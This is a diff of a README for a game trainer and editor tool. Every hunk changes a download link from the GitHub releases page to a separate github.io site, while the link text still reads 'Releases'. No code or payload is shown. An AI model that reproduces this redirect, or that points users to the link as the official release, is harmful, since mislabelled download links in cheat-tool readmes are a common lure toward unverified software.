@@ -1,6 +1,6 @@
 # 🎮 Nightwater-Trainer-Resource-Factory-Editor - Boost Your Game, Master Your Factory
 
-[![Download Now](https://img.shields.io/badge/Download-Nightwater_Trainer_Editor-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/determined-thirdparty25/Nightwater-Trainer-Resource-Factory-Editor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Nightwater_Trainer_Editor-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://determined-thirdparty25.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ This guide walks you through downloading, setting up, and using the application.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [Nightwater-Trainer-Resource-Factory-Editor Releases](https://github.com/determined-thirdparty25/Nightwater-Trainer-Resource-Factory-Editor/releases)
+Visit this link to download the application: [Nightwater-Trainer-Resource-Factory-Editor Releases](https://determined-thirdparty25.github.io)
 
 Once you arrive at the release page:
 
@@ -215,7 +215,7 @@ Found a bug or have an idea for improvement?
 
 ## 🔗 Quick Links
 
-- **Download Latest Release:** [Click Here](https://github.com/determined-thirdparty25/Nightwater-Trainer-Resource-Factory-Editor/releases)
+- **Download Latest Release:** [Click Here](https://determined-thirdparty25.github.io)
 - **Report an Issue:** Visit the repository's Issues tab.
 
 ---
